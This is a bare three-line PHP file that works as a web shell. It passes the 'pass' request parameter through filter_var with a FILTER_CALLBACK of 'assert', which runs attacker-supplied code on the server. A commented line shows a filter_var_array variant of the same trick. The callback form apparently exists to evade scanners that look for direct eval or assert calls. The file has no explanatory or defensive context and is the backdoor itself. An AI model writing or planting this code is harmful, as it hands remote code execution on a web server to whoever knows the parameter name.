<?php
filter_var($_REQUEST['pass'], FILTER_CALLBACK, array('options' => 'assert'));
//filter_var_array(array('test' => $_REQUEST['pass']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));
?>
